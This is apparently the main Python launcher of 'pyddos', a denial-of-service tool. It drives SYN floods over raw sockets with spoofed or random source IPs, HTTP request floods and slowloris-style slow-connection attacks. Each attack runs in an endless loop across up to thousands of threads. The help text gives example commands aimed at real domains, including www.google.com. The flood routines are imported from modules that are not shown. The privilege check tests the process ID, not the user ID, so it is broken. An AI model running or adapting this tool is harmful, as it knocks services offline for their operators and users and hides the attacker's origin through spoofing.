from socket import *
#!/usr/bin/env python3

version= '3.0'
title = '''

      _ \        __ \  __ \               ___|           _)       |   
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
           ____/                                            _|         
                                                                    
 DDos python script | Script used for testing ddos | Ddos attack     
 Author: ___T7hM1___                                                
 Github: http://github.com/t7hm1/pyddos                             
 Version:'''+version+''' 
'''
import os
import sys
import time
from argparse import ArgumentParser, RawTextHelpFormatter
from termcolor import colored, cprint
from mod.add_bots import add_bots
from mod.add_useragent import add_useragent
from mod.synfood import Synflood
from mod.check_tgt import check_tgt
from mod.valid_ip import fake_ip
from mod.pyslow.pyslow import Pyslow
from mod.request.request import Requester
from struct import pack
def main():
	parser = ArgumentParser(
        usage='./%(prog)s -t [target] -p [port] -t [number threads]',
        formatter_class=RawTextHelpFormatter,
        prog='pyddos',
        description=cprint(title,'white',attrs=['bold']),
        epilog='''
Example:
    ./%(prog)s -d www.example.com -p 80 -T 2000 -Pyslow
    ./%(prog)s -d www.domain.com -s 100 -Request
    ./%(prog)s -d www.google.com -Synflood -T 5000 -t 10.0
'''
)
	options = parser.add_argument_group('options','')
	options.add_argument('-d',metavar='<ip|domain>',default=False,help='Specify your target such an ip or domain name')
	options.add_argument('-t',metavar='<float>',default=5.0,help='Set timeout for socket')
	options.add_argument('-T',metavar='<int>',default=1000,help='Set threads number for connection (default = 1000)')
	options.add_argument('-p',metavar='<int>',default=80,help='Specify port target (default = 80)' + colored(' |Only required with pyslow attack|','red'))
	options.add_argument('-s',metavar='<int>',default=100,help='Set sleep time for reconnection')
	options.add_argument('-i',metavar='<ip address>',default=False,help='Specify spoofed ip unless use fake ip')
	options.add_argument('-Request',action='store_true',help='Enable request target')
	options.add_argument('-Synflood',action='store_true',help='Enable synflood attack')
	options.add_argument('-Pyslow',action='store_true',help='Enable pyslow attack')
	options.add_argument('--fakeip',action='store_true',default=False,help='Option to create fake ip if not specify spoofed ip')
	args = parser.parse_args()
	if args.d == False:
		parser.print_help()
		sys.exit()
	add_bots();add_useragent()
	if args.d:
		check_tgt(args)
	if args.Synflood:
		uid = os.getpid()
		if uid == 0:
			cprint('[*] You have enough permisson to run this script','green')
			time.sleep(0.5)
		else:
			sys.exit(cprint('[-] You haven\'t enough permission to run this script','red'))
		tgt=check_tgt(args)
		synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
		synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
		ts=[]
		threads=[]
		print (colored('[*] Started SYN Flood: ','blue')+colored(tgt,'red'))
		while 1:
			if args.i == False:
				args.fakeip = True
				if args.fakeip == True:
					ip = fake_ip()
			else:
				ip = args.i
			try:
				for x in range(0,int(args.T)):
					thread=Synflood(tgt,ip,sock=synsock)
					thread.setDaemon(True)
					thread.start()
					thread.join()
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user','red'))
	elif args.Request:
		tgt = args.d
		threads = []
		print (colored('[*] Start send request to: ','blue')+colored(tgt,'red'))
		while 1:
			try:
				for x in range(int(args.T)):
					t=Requester(tgt)
					t.daemon = True
					t.start()
					t.join()
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user','red'))
	elif args.Pyslow:
		try:
			tgt = args.d
			port = args.p
			to = float(args.t)
			st = int(args.s)
			threads = int(args.T)
		except Exception as e:
			print ('[-]',e)
		while 1:
			try:
				worker=Pyslow(tgt,port,to,threads,st)
				worker.doconnection()
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user','red'))
	if not (args.Synflood) and not (args.Request) and not (args.Pyslow):
		parser.print_help()
		print
		sys.exit(cprint('[-] You must choose attack type','red'))
